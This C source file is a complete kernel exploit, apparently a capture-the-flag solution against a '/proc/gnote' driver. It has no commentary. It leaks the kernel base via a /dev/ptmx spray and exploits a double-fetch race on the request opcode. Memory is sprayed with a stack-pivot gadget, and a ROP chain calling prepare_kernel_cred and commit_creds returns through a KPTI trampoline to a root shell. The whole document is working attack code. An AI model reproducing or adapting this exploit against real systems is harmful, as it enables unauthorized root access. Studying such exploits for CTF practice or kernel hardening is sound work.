// gcc exp.c -o exp -static -lpthread -masm=intel -Wl,--section-start=.note.gnu.build-id=0x50000000
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <stdint.h>
#include <syscall.h>
#include <string.h>
#include <pthread.h>
#include <signal.h>
#include <sys/mman.h>
#include <linux/tty.h>

#define SPRAY_SIZE 0x1000000
#define MAL_INDEX 0x8000100

struct Var{
	unsigned int opt;
	unsigned int val;
};

unsigned long long user_cs, user_ss, user_eflags, user_sp;
struct Var req;
int fd;
int trigger = 0;

int addnote(unsigned int size)
{
	req.opt = 1;
	req.val = size;
	return write(fd, &req, sizeof(req));
}

int selnote(unsigned int idx)
{
	req.opt = 5;
	req.val = idx;
	return write(fd, &req, sizeof(req));
}

void* race()
{
	while(!trigger)
	{
		req.opt = MAL_INDEX;
	}
}

void save_tf()
{
    __asm__(
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_eflags;"
    );
}

void shell()
{
	trigger = 1;
	system("/bin/sh");
}

int main()
{
	save_tf();
	
	// get leak

	int pfd;

	pfd = open("/dev/ptmx", O_RDWR|O_NOCTTY);
	close(pfd);

	fd = open("/proc/gnote", O_RDWR);

	addnote(0x270);
	selnote(0);

	char leak[0x300];
	memset(leak, 0, sizeof(leak));

	read(fd, leak, 0x270);

	unsigned long long *pl = leak;
	unsigned long long kbase;

	if ((pl[3]&0xfff)==0x360) kbase = pl[3] - 0xa35360;
	else kbase = pl[3] - 0xa35260;

	printf("kernel base : 0x%llx\n", kbase);
	if (kbase&0xfff) {printf("invalid kernel base\n"); exit(0);}

	unsigned long long commit_creds = kbase + 0x69df0;
	unsigned long long prepare_kernel_cred = kbase + 0x69fe0;
	
	unsigned long long xchg = kbase + 0x1992a;
	unsigned long long mov_rdi_rax = kbase + 0x21ca6a;
	unsigned long long prdi = kbase + 0x1c20d;
	/*
	unsigned long long prsp = kbase + 0x3787b;
	unsigned long long prbp = kbase + 0x363;
	unsigned long long leaveret = kbase + 0x1cb1;
	unsigned long long ret = kbase + 0x1cc;
	unsigned long long swapgs = kbase + 0x3efc4;
	unsigned long long iretq = kbase + 0x1dd06;	
	*/
	unsigned long long kpti = kbase + 0x600a4a;

	printf("xchg : 0x%llx\n", xchg);
	printf("prepare_kernel_cred : 0x%llx\n", prepare_kernel_cred);
	printf("commit_creds : 0x%llx\n", commit_creds);

	// get root

	unsigned long long *spray = mmap(0x10000, SPRAY_SIZE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0);
	printf("spray : 0x%llx\n", spray);
	if (spray!=0x10000) {printf("invalid spray address\n"); exit(0);}

	for (int i=0; i<(SPRAY_SIZE-0x10000)/sizeof(unsigned long long); i++)
	{
		spray[i] = xchg;
	}

	unsigned long long *stack = mmap(xchg&0xfffff000-0x2000, 0x5000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0);
	printf("fake stack : 0x%llx\n", stack);

	unsigned long long rop[] = 
	{
		prdi,
		0,
		prepare_kernel_cred,
		mov_rdi_rax,
		0x4141414141414141,
		commit_creds,
		kpti,
		/*
		swapgs,
		0x4141414141414141,
		iretq,
		*/
		0,
		0,
		&shell,
		user_cs,
		user_eflags,
		user_sp,
		user_ss
	};
	memcpy(xchg&0xffffffff, rop, sizeof(rop));
	printf("rop : 0x%llx\n", xchg&0xffffffff);

	pthread_t dfetch;
	pthread_create(&dfetch, NULL, race, NULL);

	while (!trigger)
	{
		req.opt = 0;
		req.val = 0x1337;
		write(fd, &req, sizeof(req));
	}
	pthread_join(dfetch, NULL);

	return 0;
}
